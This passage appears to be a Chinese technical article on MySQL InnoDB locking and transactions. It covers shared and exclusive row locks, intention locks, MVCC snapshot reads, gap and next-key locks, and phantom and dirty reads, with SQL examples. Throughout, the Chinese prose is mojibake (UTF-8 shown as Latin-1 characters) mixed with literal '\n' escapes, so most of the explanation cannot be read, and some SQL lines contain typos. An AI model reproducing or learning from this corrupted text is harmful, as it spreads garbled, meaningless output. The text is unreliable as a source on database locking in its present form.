é”å…¼å®¹ã€‚éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒS å’Œ X é”éƒ½æ˜¯è¡Œé”ï¼Œå…¼å®¹æ˜¯æŒ‡å¯¹åŒä¸€è®°å½•ï¼ˆrowï¼‰é”çš„å…¼å®¹æ€§æƒ…å†µã€‚\n\n### 1.3 æ„å‘é”ï¼ˆå’Œå…¶ä»–é”å¯å…±å­˜ï¼‰\n\nInnoDBå­˜å‚¨å¼•æ“æ”¯æŒå¤šç²’åº¦ï¼ˆgranularï¼‰é”å®šï¼Œ**è¿™ç§é”å®šå…è®¸äº‹åŠ¡åœ¨è¡Œçº§ä¸Šçš„é”å’Œè¡¨çº§ä¸Šçš„é”åŒæ—¶å­˜åœ¨ã€‚**ä¸ºäº†æ”¯æŒåœ¨ä¸åŒç²’åº¦ä¸Šè¿›è¡ŒåŠ é”æ“ä½œï¼ŒInnoDBå­˜å‚¨å¼•æ“æ”¯æŒä¸€ç§é¢å¤–çš„é”æ–¹å¼ï¼Œç§°ä¹‹ä¸ºæ„å‘é”ï¼ˆIntention Lockï¼‰ã€‚æ„å‘é”æ˜¯å°†é”å®šçš„å¯¹è±¡åˆ†ä¸ºå¤šä¸ªå±‚æ¬¡ï¼Œæ„å‘é”æ„å‘³ç€äº‹åŠ¡å¸Œæœ›åœ¨æ›´ç»†ç²’åº¦ï¼ˆfine granularityï¼‰ä¸Šè¿›è¡ŒåŠ é”ã€‚\n\n\n\nInnoDBå­˜å‚¨å¼•æ“æ”¯æŒæ„å‘é”è®¾è®¡æ¯”è¾ƒç®€ç»ƒï¼Œå…¶æ„å‘é”å³ä¸ºè¡¨çº§åˆ«çš„é”ã€‚è®¾è®¡ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­æ­ç¤ºä¸‹ä¸€è¡Œå°†è¢«è¯·æ±‚çš„é”ç±»å‹ã€‚å…¶æ”¯æŒä¸¤ç§æ„å‘é”ï¼š\n\n1ï¼‰æ„å‘å…±äº«é”ï¼ˆIS Lockï¼‰ï¼Œäº‹åŠ¡æƒ³è¦è·å¾—ä¸€å¼ è¡¨ä¸­æŸå‡ è¡Œçš„å…±äº«é”\n\n2ï¼‰æ„å‘æ’ä»–é”ï¼ˆIX Lockï¼‰ï¼Œäº‹åŠ¡æƒ³è¦è·å¾—ä¸€å¼ è¡¨ä¸­æŸå‡ è¡Œçš„æ’ä»–é”\n\n<img src=\"mysqlçš„é”å’Œäº‹åŠ¡æœºåˆ¶/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\nè‹¥å°†ä¸Šé”çš„å¯¹è±¡çœ‹æˆä¸€æ£µæ ‘ï¼Œé‚£ä¹ˆå¯¹æœ€ä¸‹å±‚çš„å¯¹è±¡ä¸Šé”ï¼Œä¹Ÿå°±æ˜¯å¯¹æœ€ç»†ç²’åº¦çš„å¯¹è±¡è¿›è¡Œä¸Šé”ï¼Œé‚£ä¹ˆé¦–å…ˆéœ€è¦å¯¹ç²—ç²’åº¦çš„å¯¹è±¡ä¸Šé”ã€‚\n\nä¾‹å¦‚å›¾6-3ï¼Œå¦‚æœéœ€è¦å¯¹é¡µä¸Šçš„è®°å½•rè¿›è¡Œä¸ŠXé”ï¼Œé‚£ä¹ˆåˆ†åˆ«éœ€è¦å¯¹æ•°æ®åº“Aã€è¡¨ã€é¡µä¸Šæ„å‘é”IXï¼Œæœ€åå¯¹è®°å½•rä¸ŠXé”ã€‚è‹¥å…¶ä¸­ä»»ä½•ä¸€ä¸ªéƒ¨åˆ†å¯¼è‡´ç­‰å¾…ï¼Œé‚£ä¹ˆè¯¥æ“ä½œéœ€è¦ç­‰å¾…ç²—ç²’åº¦é”çš„å®Œæˆã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨å¯¹è®°å½•råŠ Xé”ä¹‹å‰ï¼Œå·²ç»æœ‰äº‹åŠ¡å¯¹è¡¨1è¿›è¡Œäº†Sè¡¨é”ï¼Œé‚£ä¹ˆè¡¨1ä¸Šå·²å­˜åœ¨Sé”ï¼Œä¹‹åäº‹åŠ¡éœ€è¦å¯¹è®°å½•råœ¨è¡¨1ä¸ŠåŠ ä¸ŠIXï¼Œç”±äºä¸å…¼å®¹ï¼Œæ‰€ä»¥è¯¥äº‹åŠ¡éœ€è¦ç­‰å¾…è¡¨é”æ“ä½œçš„å®Œæˆã€‚\n\n### 1.4 è¡Œé”å’Œæ„å‘é”çš„å…¼å®¹\n\n| é”                 | ç±»åˆ«       | ä½¿ç”¨                                                  |\n| ------------------ | ---------- | ----------------------------------------------------- |\n| å…±äº«é” (S é”)      | è¡Œé”(è¯»é”) | select * from table where id = 1 lock  in share mode; |\n| æ’å®ƒé” (X é”)      | è¡Œé”(å†™é”) | select * from table where id = 1 for update;          |\n| æ„å‘å…±äº«é” (IS é”) | è¡¨é”       | æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤,ç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œ                     |\n| æ„å‘æ’ä»–é” (IX é”) | è¡¨é”       | æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤,ç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œ                     |\n\n+ å…¼å®¹æ€§\n\n|      | IS   | IX   |\n| ---- | ---- | ---- |\n| IS   | å…¼å®¹ | å…¼å®¹ |\n| IX   | å…¼å®¹ | å…¼å®¹ |\n\n|      | S    | X    |\n| ---- | ---- | ---- |\n| IS   | å…¼å®¹ | äº’æ–¥ |\n| IX   | äº’æ–¥ | äº’æ–¥ |\n\n### 1.5 é”å‡çº§\n\nInnoDBå­˜å‚¨å¼•æ“ä¸å­˜åœ¨é”å‡çº§çš„é—®é¢˜ã€‚å› ä¸ºå…¶ä¸æ˜¯æ ¹æ®æ¯ä¸ªè®°å½•æ¥äº§ç”Ÿè¡Œé”çš„ï¼Œç›¸åï¼Œå…¶æ ¹æ®æ¯ä¸ªäº‹åŠ¡è®¿é—®çš„æ¯ä¸ªé¡µå¯¹é”è¿›è¡Œç®¡ç†çš„ï¼Œé‡‡ç”¨çš„æ˜¯ä½å›¾çš„æ–¹å¼ã€‚å› æ­¤ä¸ç®¡ä¸€ä¸ªäº‹åŠ¡é”ä½é¡µä¸­ä¸€ä¸ªè®°å½•è¿˜æ˜¯å¤šä¸ªè®°å½•ï¼Œå…¶å¼€é”€é€šå¸¸éƒ½æ˜¯ä¸€è‡´çš„ã€‚\n\nå‡è®¾ä¸€å¼ è¡¨æœ‰3 000 000ä¸ªæ•°æ®é¡µï¼Œæ¯ä¸ªé¡µå¤§çº¦æœ‰100æ¡è®°å½•ï¼Œé‚£ä¹ˆæ€»å…±æœ‰300 000 000æ¡è®°å½•ã€‚è‹¥æœ‰ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œå…¨è¡¨æ›´æ–°çš„SQLè¯­å¥ï¼Œåˆ™éœ€è¦å¯¹æ‰€æœ‰è®°å½•åŠ Xé”ã€‚è‹¥æ ¹æ®æ¯è¡Œè®°å½•äº§ç”Ÿé”å¯¹è±¡è¿›è¡ŒåŠ é”ï¼Œå¹¶ä¸”æ¯ä¸ªé”å ç”¨10å­—èŠ‚ï¼Œåˆ™ä»…å¯¹é”ç®¡ç†å°±éœ€è¦å·®ä¸å¤šéœ€è¦3GBçš„å†…å­˜ã€‚\n\nè€ŒInnoDBå­˜å‚¨å¼•æ“æ ¹æ®é¡µè¿›è¡ŒåŠ é”ï¼Œå¹¶é‡‡ç”¨ä½å›¾æ–¹å¼ï¼Œå‡è®¾æ¯ä¸ªé¡µå­˜å‚¨çš„é”ä¿¡æ¯å ç”¨30ä¸ªå­—èŠ‚ï¼Œåˆ™é”å¯¹è±¡ä»…éœ€90MBçš„å†…å­˜ã€‚ç”±æ­¤å¯è§ä¸¤è€…å¯¹äºé”èµ„æºå¼€é”€çš„å·®è·ä¹‹å¤§ã€‚\n\n# 2. é”å®šåº¦å’Œéé”å®šè¯»\n\n### 2.1 éä¸€è‡´æ€§è¯»(æ™®é€šselect)\n\nå°±æ˜¯æ™®é€šçš„ SELECT è¯­å¥(æ²¡æœ‰åŠ é”åç¼€)ï¼Œ innodb ä¸ä¼šåŠ é”ï¼Œ å°±ç®—åˆ«äººé”äº†ä½ ä¹Ÿå¯ä»¥è¯»ã€‚\n\nInnoDBå­˜å‚¨å¼•æ“é€šè¿‡è¡Œå¤šç‰ˆæœ¬æ§åˆ¶ï¼ˆmulti versioningï¼‰çš„æ–¹å¼æ¥è¯»å–å½“å‰æ‰§è¡Œæ—¶é—´æ•°æ®åº“ä¸­è¡Œçš„æ•°æ®ã€‚å¦‚æœè¯»å–çš„è¡Œæ­£åœ¨æ‰§è¡ŒDELETEæˆ–UPDATEæ“ä½œï¼Œè¿™æ—¶è¯»å–æ“ä½œä¸ä¼šå› æ­¤å»ç­‰å¾…è¡Œä¸Šé”çš„é‡Šæ”¾ã€‚ç›¸ååœ°ï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šå»è¯»å–è¡Œçš„ä¸€ä¸ªå¿«ç…§æ•°æ®ã€‚\n\n<img src=\"mysqlçš„é”å’Œäº‹åŠ¡æœºåˆ¶/2.png\" alt=\"1\" style=\"zoom:50%;\" />\n\néé”å®šè¯»ï¼Œå› ä¸ºä¸éœ€è¦ç­‰å¾…è®¿é—®çš„è¡Œä¸ŠXé”çš„é‡Šæ”¾ã€‚å¿«ç…§æ•°æ®æ˜¯æŒ‡è¯¥è¡Œçš„ä¹‹å‰ç‰ˆæœ¬çš„æ•°æ®ï¼Œè¯¥å®ç°æ˜¯é€šè¿‡undoæ®µæ¥å®Œæˆã€‚è€Œundoç”¨æ¥åœ¨äº‹åŠ¡ä¸­å›æ»šæ•°æ®ï¼Œå› æ­¤å¿«ç…§æ•°æ®æœ¬èº«æ˜¯æ²¡æœ‰é¢å¤–çš„å¼€é”€ã€‚æ­¤å¤–ï¼Œè¯»å–å¿«ç…§æ•°æ®æ˜¯ä¸éœ€è¦ä¸Šé”çš„ï¼Œå› ä¸ºæ²¡æœ‰äº‹åŠ¡éœ€è¦å¯¹å†å²çš„æ•°æ®è¿›è¡Œä¿®æ”¹æ“ä½œã€‚\n\néé”å®šè¯»æœºåˆ¶æå¤§åœ°æé«˜äº†æ•°æ®åº“çš„å¹¶å‘æ€§ã€‚åœ¨InnoDBå­˜å‚¨å¼•æ“çš„é»˜è®¤è®¾ç½®ä¸‹ï¼Œè¿™æ˜¯é»˜è®¤çš„è¯»å–æ–¹å¼ï¼Œå³è¯»å–ä¸ä¼šå ç”¨å’Œç­‰å¾…è¡¨ä¸Šçš„é”ã€‚å¹¶ä¸æ˜¯åœ¨æ¯ä¸ªäº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹éƒ½æ˜¯é‡‡ç”¨éé”å®šçš„ä¸€è‡´æ€§è¯»ã€‚\n\nå¿«ç…§æ•°æ®å…¶å®å°±æ˜¯å½“å‰è¡Œæ•°æ®ä¹‹å‰çš„å†å²ç‰ˆæœ¬ï¼Œæ¯è¡Œè®°å½•å¯èƒ½æœ‰å¤šä¸ªç‰ˆæœ¬ã€‚å°±å›¾6-4æ‰€æ˜¾ç¤ºçš„ï¼Œä¸€ä¸ªè¡Œè®°å½•å¯èƒ½æœ‰ä¸æ­¢ä¸€ä¸ªå¿«ç…§æ•°æ®ï¼Œä¸€èˆ¬ç§°è¿™ç§æŠ€æœ¯ä¸ºè¡Œå¤šç‰ˆæœ¬æŠ€æœ¯ã€‚ç”±æ­¤å¸¦æ¥çš„å¹¶å‘æ§åˆ¶ï¼Œç§°ä¹‹ä¸ºå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMulti Version Concurrency Controlï¼ŒMVCCï¼‰ã€‚\n\n\n\n**RC å’Œ RR çº§åˆ«éä¸€è‡´æ€§è¯»çš„åŒºåˆ«**\n\nåœ¨äº‹åŠ¡éš”ç¦»çº§åˆ«READ COMMITTEDå’ŒREPEATABLE READï¼ˆInnoDBå­˜å‚¨å¼•æ“çš„é»˜è®¤äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼‰ä¸‹ï¼ŒInnoDBå­˜å‚¨å¼•æ“ä½¿ç”¨éé”å®šçš„ä¸€è‡´æ€§è¯»ã€‚ç„¶è€Œï¼Œå¯¹äºå¿«ç…§æ•°æ®çš„å®šä¹‰å´ä¸ç›¸åŒ**ã€‚**\n\nåœ¨READ COMMITTEDäº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹ï¼Œå¯¹äºå¿«ç…§æ•°æ®ï¼Œéä¸€è‡´æ€§è¯»æ€»æ˜¯è¯»å–è¢«é”å®šè¡Œçš„æœ€æ–°ä¸€ä»½å¿«ç…§æ•°æ®ã€‚è€Œåœ¨REPEATABLE READäº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹ï¼Œå¯¹äºå¿«ç…§æ•°æ®ï¼Œéä¸€è‡´æ€§è¯»æ€»æ˜¯è¯»å–äº‹åŠ¡å¼€å§‹æ—¶çš„è¡Œæ•°æ®ç‰ˆæœ¬ã€‚\n\n\n\n- session A\n\n```\nSELECT*FROM parent WHERE id=1;\n\n1\n```\n\n- session B\n\n```\nUPDATE parent SET id=3 WHERE id=1;\n```\n\nåœ¨ä¼šè¯ B ä¸­å°†äº‹åŠ¡è¡¨ parent ä¸­ id ä¸º 1 çš„è®°å½•ä¿®æ”¹ä¸º id=3ï¼Œä½†æ˜¯äº‹åŠ¡åŒæ ·æ²¡æœ‰æäº¤ï¼Œè¿™æ · id=1 çš„è¡Œå…¶å®åŠ äº†ä¸€ä¸ª X é”ã€‚\n\nå›åˆ°ä¹‹å‰çš„ä¼šè¯ Aï¼Œæ¥ç€ä¸Šæ¬¡æœªæäº¤çš„äº‹åŠ¡ï¼Œæ‰§è¡Œ SQL è¯­å¥ `SELECT*FROM parent WHERE id=1` çš„æ“ä½œï¼Œè¿™æ—¶ä¸ç®¡ä½¿ç”¨ READ COMMITTED è¿˜æ˜¯ REPEATABLE READ çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œæ˜¾ç¤ºçš„æ•°æ®åº”è¯¥éƒ½æ˜¯ 1ã€‚\n\n- session A\n\n```\nSELECT*FROM parent WHERE id=1;\n\n1\n```\n\n- session B\n\n```\ncommit\n```\n\nåœ¨ä¼šè¯ B æäº¤äº‹åŠ¡åï¼Œè¿™æ—¶åœ¨ä¼šè¯ A ä¸­å†è¿è¡Œ `SELECT*FROM parent WHERE id=1 ` çš„ SQL è¯­å¥ã€‚\nå¯¹äº READ COMMITTED çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œå®ƒæ€»æ˜¯è¯»å–è¡Œçš„æœ€æ–°ç‰ˆæœ¬ã€‚ï¼ˆå…¶ä»–äº‹åŠ¡ä¿®æ”¹åçš„å€¼ï¼Œè¯»åˆ°çš„æ˜¯NULLï¼Œåº”è¯¥è¢«æ”¹äº†ï¼‰\nå¯¹äº REPEATABLE READ çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œæ€»æ˜¯è¯»å–äº‹åŠ¡å¼€å§‹æ—¶çš„è¡Œæ•°æ®ã€‚ï¼ˆå½“å‰äº‹åŠ¡æœ€åˆçš„å€¼ï¼Œè¯»åˆ°çš„è¿˜æ˜¯1ï¼‰\n\n### 2.2 ä¸€è‡´æ€§è¯»ï¼ˆselectåé¢åŠ é”è¯­æ³•æŸ¥è¯¢ï¼‰\n\nå³ä½¿æ˜¯å¯¹äºSELECTçš„åªè¯»æ“ä½œã€‚InnoDBå­˜å‚¨å¼•æ“å¯¹äºSELECTè¯­å¥æ”¯æŒä¸¤ç§ä¸€è‡´æ€§çš„é”å®šè¯»ï¼ˆlocking readï¼‰æ“ä½œï¼š\n\n+ SELECTâ€¦FOR UPDATE\n\n+ SELECTâ€¦LOCK IN SHARE MODE\n\nSELECTâ€¦FOR UPDATE å¯¹è¯»å–çš„è¡Œè®°å½•åŠ ä¸€ä¸ª X é”ï¼Œå…¶ä»–äº‹åŠ¡ä¸èƒ½å¯¹å·²é”å®šçš„è¡ŒåŠ ä¸Šä»»ä½•é”ã€‚SELECTâ€¦LOCK IN SHARE MODE å¯¹è¯»å–çš„è¡Œè®°å½•åŠ ä¸€ä¸ª S é”ï¼Œå…¶ä»–äº‹åŠ¡å¯ä»¥å‘è¢«é”å®šçš„è¡ŒåŠ  S é”ï¼Œä½†æ˜¯å¦‚æœåŠ  X é”ï¼Œåˆ™ä¼šè¢«é˜»å¡ã€‚\n\nå¯¹äºä¸€è‡´æ€§éé”å®šè¯»ï¼Œå³ä½¿è¯»å–çš„è¡Œå·²è¢«æ‰§è¡Œäº†SELECTâ€¦FOR UPDATEï¼Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè¯»å–çš„ï¼Œè¿™å’Œä¹‹å‰è®¨è®ºçš„æƒ…å†µä¸€æ ·ã€‚\n\nSELECTâ€¦FOR UPDATEï¼ŒSELECTâ€¦LOCK IN SHARE MODEå¿…é¡»åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œå½“äº‹åŠ¡æäº¤äº†ï¼Œé”ä¹Ÿå°±é‡Šæ”¾äº†ã€‚å› æ­¤åœ¨ä½¿ç”¨ä¸Šè¿°ä¸¤å¥SELECTé”å®šè¯­å¥æ—¶ï¼ŒåŠ¡å¿…åŠ ä¸ŠBEGINï¼ŒSTART TRANSACTIONæˆ–è€…SET AUTOCOMMIT=0ã€‚\n\n# 3.è¡Œé”ç®—æ³•\n\n### 3.1 è¡Œé”çš„ 3 ç§ç®—æ³•\n\nInnoDB å­˜å‚¨å¼•æ“æœ‰ 3 ç§è¡Œé”çš„ç®—æ³•ï¼Œå…¶åˆ†åˆ«æ˜¯ï¼š\n\n+ Record Lockï¼šå•ä¸ªè¡Œè®°å½•ä¸Šçš„é”ã€‚\n\n+ Gap Lockï¼šé—´éš™é”ï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼Œä½†ä¸åŒ…å«è®°å½•æœ¬èº«ã€‚\n\n+ Next-Key Lockâˆ¶   Gap Lock+Record Lockï¼Œé”å®šä¸€ä¸ªèŒƒå›´ï¼Œå¹¶ä¸”é”å®šè®°å½•æœ¬èº«ã€‚\n\nRecord Lock æ€»æ˜¯ä¼šå»é”ä½ç´¢å¼•è®°å½•ï¼Œå¦‚æœ InnoDB å­˜å‚¨å¼•æ“è¡¨åœ¨å»ºç«‹çš„æ—¶å€™æ²¡æœ‰è®¾ç½®ä»»ä½•ä¸€ä¸ªç´¢å¼•ï¼Œé‚£ä¹ˆè¿™æ—¶ InnoDB å­˜å‚¨å¼•æ“ä¼šä½¿ç”¨éšå¼çš„ä¸»é”®æ¥è¿›è¡Œé”å®šã€‚\n\nåœ¨Next-Key Lockç®—æ³•ä¸‹ï¼ŒInnoDBå¯¹äºè¡Œçš„æŸ¥è¯¢éƒ½æ˜¯é‡‡ç”¨è¿™ç§é”å®šç®—æ³•ã€‚ä¾‹å¦‚ä¸€ä¸ªç´¢å¼•æœ‰10ï¼Œ11ï¼Œ13å’Œ20è¿™å››ä¸ªå€¼ï¼Œé‚£ä¹ˆè¯¥ç´¢å¼•å¯èƒ½è¢«Next-Key Lockingçš„åŒºé—´ä¸ºï¼š\n\n```bash\n(-âˆ,10]\n(10,11]\n(11,13]\n(13ï¼Œ20]\n(20,+âˆ)\n```\n\nå½“æŸ¥è¯¢çš„ç´¢å¼•å«æœ‰å”¯ä¸€å±æ€§æ—¶ï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šå¯¹Next-Key Lockè¿›è¡Œä¼˜åŒ–ï¼Œå°†å…¶é™çº§ä¸ºRecord Lockï¼Œå³ä»…é”ä½ç´¢å¼•æœ¬èº«ï¼Œè€Œä¸æ˜¯èŒƒå›´ã€‚\n\n**è¡Œé”ä¸¾ä¾‹**\n\n```sql\nCREATE TABLE t(a INT PRIMARY KEY);\nINSERT INTO t SELECT 1;\nINSERT INTO t SELECT 2;\nINSERT INTO t SELECT 5;\n\nSELECT * FROM t WHERE a = 5 FOR UPDATE;\nINSERT INTOt SELECT 4; # å¯ä»¥æ’å…¥\n```\n\n\n\nè¡¨tå…±æœ‰1ã€2ã€5ä¸‰ä¸ªå€¼ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œåœ¨ä¼šè¯Aä¸­é¦–å…ˆå¯¹a=5è¿›è¡ŒXé”å®šã€‚è€Œç”±äºaæ˜¯ä¸»é”®ä¸”å”¯ä¸€ï¼Œå› æ­¤é”å®šçš„ä»…æ˜¯5è¿™ä¸ªå€¼ï¼Œè¿™æ ·åœ¨ä¼šè¯Bä¸­æ’å…¥å€¼4è€Œä¸ä¼šé˜»å¡ï¼Œå¯ä»¥ç«‹å³æ’å…¥å¹¶è¿”å›ã€‚å³é”å®šç”±Next-Key Lockç®—æ³•é™çº§ä¸ºäº†Record Lockï¼Œä»è€Œæé«˜åº”ç”¨çš„å¹¶å‘æ€§ã€‚\n\n\n\nNext-Key Locké™çº§ä¸ºRecord Lockä»…åœ¨æŸ¥è¯¢çš„åˆ—æ˜¯å”¯ä¸€ç´¢å¼•çš„æƒ…å†µä¸‹ã€‚è‹¥æ˜¯è¾…åŠ©ç´¢å¼•ï¼Œåˆ™æƒ…å†µä¼šå®Œå…¨ä¸åŒã€‚\n\n```sql\nCREATE TABLE z(a INT,b INT,PRIMARY KEY(a),KEY(b));\nINSERT INTO z SELECT 1,1;\nINSERT INTO z SELECT 3,1;\nINSERT INTO z SELECT 5,3;\nINSERT INTO z SELECT 7,6;\nINSERT INTO z SELECT 10,8;\n\n(-æ— ç©·,1](1,3](3,6](6,8](8,+æ— ç©·)\n\nSELECT*FROM z WHERE b=3 FOR UPDATE;\n\n```\n\nç”±äºæœ‰ä¸¤ä¸ªç´¢å¼•ï¼Œå…¶éœ€è¦åˆ†åˆ«è¿›è¡Œé”å®šã€‚\n\nå¯¹äºèšé›†ç´¢å¼•ï¼Œå…¶ä»…å¯¹åˆ—aç­‰äº5çš„ç´¢å¼•åŠ ä¸ŠRecord Lockã€‚è€Œå¯¹äºè¾…åŠ©ç´¢å¼•ï¼Œå…¶åŠ ä¸Šçš„æ˜¯Next-Key Lockï¼Œé”å®šçš„èŒƒå›´æ˜¯(1ï¼Œ3)ï¼Œç‰¹åˆ«éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒInnoDBå­˜å‚¨å¼•æ“è¿˜ä¼šå¯¹è¾…åŠ©ç´¢å¼•ä¸‹ä¸€ä¸ªé”®å€¼åŠ ä¸Šgap lockï¼Œå³è¿˜æœ‰ä¸€ä¸ªè¾…åŠ©ç´¢å¼•èŒƒå›´ä¸º(3ï¼Œ6)çš„é”ã€‚å› æ­¤ï¼Œè‹¥åœ¨æ–°ä¼šè¯Bä¸­è¿è¡Œä¸‹é¢çš„SQLè¯­å¥ï¼Œéƒ½ä¼šè¢«é˜»å¡ï¼š\n\n```sql\nSELECT*FROM z WHERE a=5 LOCK IN SHARE MODE; # å·²ç»å¯¹èšé›†ç´¢å¼•ä¸­åˆ—a=5çš„å€¼åŠ ä¸ŠXé”ï¼Œå› æ­¤æ‰§è¡Œä¼šè¢«é˜»å¡ã€‚\nINSERT INTO z SELECT 4,2; # ä½†æ˜¯æ’å…¥çš„è¾…åŠ©ç´¢å¼•å€¼2åœ¨é”å®šçš„èŒƒå›´(1ï¼Œ3)ä¸­ï¼Œå› æ­¤æ‰§è¡ŒåŒæ ·ä¼šè¢«é˜»å¡ã€‚\nINSERT INTO z SELECT 6,5; # æ’å…¥çš„å€¼5åœ¨å¦ä¸€ä¸ªé”å®šçš„èŒƒå›´(3ï¼Œ6)ä¸­ï¼Œæ•…åŒæ ·éœ€è¦ç­‰å¾…ã€‚\n```\n\n\n\nè€Œä¸‹é¢çš„SQLè¯­å¥ï¼Œä¸ä¼šè¢«é˜»å¡ï¼Œå¯ä»¥ç«‹å³æ‰§è¡Œï¼š\n\n```sql\nINSERT INTO z SELECT 8,6;\nINSERT INTO z SELECT 2,0;\nINSERT INTO z SELECT 6,7;\n```\n\n\n\n**é—´éš™é”**\n\nåœ¨InnoDBå­˜å‚¨å¼•æ“ä¸­ï¼Œå¯¹äºINSERTçš„æ“ä½œï¼Œå…¶ä¼šæ£€æŸ¥æ’å…¥è®°å½•çš„ä¸‹ä¸€æ¡è®°å½•æ˜¯å¦è¢«é”å®šï¼Œè‹¥å·²ç»è¢«é”å®šï¼Œåˆ™ä¸å…è®¸æŸ¥è¯¢ã€‚å¯¹äºä¸Šé¢çš„ä¾‹å­ï¼Œä¼šè¯Aå·²ç»é”å®šäº†è¡¨zä¸­b=3çš„è®°å½•ï¼Œå³å·²ç»é”å®šäº†(1ï¼Œ3)çš„èŒƒå›´ï¼Œè¿™æ—¶è‹¥åœ¨å…¶ä»–ä¼šè¯ä¸­è¿›è¡Œå¦‚ä¸‹çš„æ’å…¥åŒæ ·ä¼šå¯¼è‡´é˜»å¡ï¼š\n\n```sql\nSELECT*FROM z WHERE b=3 FOR UPDATE;\n\nINSERT INTO z SELECT 2,2; # é˜»å¡\n\nINSERT INTO z SELECT 2,0; # å¯ä»¥æ‰§è¡Œ\n```\n\n\n\nå¯¹äºå”¯ä¸€é”®å€¼çš„é”å®šï¼ŒNext-Key Locké™çº§ä¸ºRecord Lockä»…å­˜åœ¨äºæŸ¥è¯¢æ‰€æœ‰çš„å”¯ä¸€ç´¢å¼•åˆ—ã€‚è‹¥å”¯ä¸€ç´¢å¼•ç”±å¤šä¸ªåˆ—ç»„æˆï¼Œè€ŒæŸ¥è¯¢ä»…æ˜¯æŸ¥æ‰¾å¤šä¸ªå”¯ä¸€ç´¢å¼•åˆ—ä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆæŸ¥è¯¢å…¶å®æ˜¯rangeç±»å‹æŸ¥è¯¢ï¼Œè€Œä¸æ˜¯pointç±»å‹æŸ¥è¯¢ï¼Œæ•…InnoDBå­˜å‚¨å¼•æ“ä¾ç„¶ä½¿ç”¨Next-Key Lockè¿›è¡Œé”å®šã€‚\n\n### 3.2 RR ç”¨ Next-Key Locking è§£å†³å¹»è¯»\n\nå³ REPEATABLE READ ä¸‹ï¼ŒInnoDB å­˜å‚¨å¼•æ“é‡‡ç”¨ Next-Key Locking æœºåˆ¶æ¥é¿å… Phantom Problemï¼ˆå¹»åƒé—®é¢˜ï¼‰ã€‚è¿™ç‚¹å¯èƒ½ä¸åŒäºä¸å…¶ä»–çš„æ•°æ®åº“ï¼Œå¦‚ Oracle æ•°æ®åº“ï¼Œå› ä¸ºå…¶å¯èƒ½éœ€è¦åœ¨ SERIALIZABLE çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹æ‰èƒ½è§£å†³ Phantom Problemã€‚\n\n\n\nè¡¨ t ç”± 1ã€2ã€5 è¿™ä¸‰ä¸ªå€¼ç»„æˆï¼Œå¯¹äº SQL è¯­å¥ `SELECT*FROM t WHERE aï¼2 FOR UPDATE`ï¼Œå…¶é”ä½çš„ä¸æ˜¯ 5 è¿™å•ä¸ªå€¼ï¼Œè€Œæ˜¯å¯¹ï¼ˆ2ï¼Œ+âˆï¼‰è¿™ä¸ªèŒƒå›´åŠ äº† X é”ã€‚å› æ­¤ä»»ä½•å¯¹äºè¿™ä¸ªèŒƒå›´çš„æ’å…¥éƒ½æ˜¯ä¸è¢«å…è®¸çš„ï¼Œä»è€Œé¿å… Phantom Problemã€‚\n\n\n\nInnoDBå­˜å‚¨å¼•æ“é»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«æ˜¯REPEATABLE READï¼Œåœ¨è¯¥éš”ç¦»çº§åˆ«ä¸‹ï¼Œå…¶é‡‡ç”¨Next-Key Lockingçš„æ–¹å¼æ¥åŠ é”ã€‚è€Œåœ¨äº‹åŠ¡éš”ç¦»çº§åˆ«READ COMMITTEDä¸‹ï¼Œå…¶ä»…é‡‡ç”¨Record Lockã€‚\n\n\n\n# 4. äº‹åŠ¡é—®é¢˜\n\n### 4.1 è„è¯»\n\nè„è¯»æŒ‡çš„å°±æ˜¯åœ¨ä¸åŒçš„äº‹åŠ¡ä¸‹ï¼Œå½“å‰äº‹åŠ¡å¯ä»¥è¯»åˆ°å¦å¤–äº‹åŠ¡æœªæäº¤çš„æ•°æ®ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥è¯»åˆ°è„æ•°æ®ã€‚è¿åäº†äº‹åŠ¡çš„éš”ç¦»æ€§ã€‚\n\nè„è¯»ç°è±¡åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¹¶ä¸å¸¸å‘ç”Ÿï¼Œä»ä¸Šé¢çš„ä¾‹å­ä¸­å°±å¯ä»¥å‘ç°ï¼Œè„è¯»å‘ç”Ÿçš„æ¡ä»¶æ˜¯éœ€è¦äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ä¸ºREAD UNCOMMITTEDï¼Œè€Œç›®å‰ç»å¤§éƒ¨åˆ†çš„æ•°æ®åº“éƒ½è‡³å°‘è®¾ç½®æˆREAD COMMITTEDã€‚\n\n\n\n### 4.2 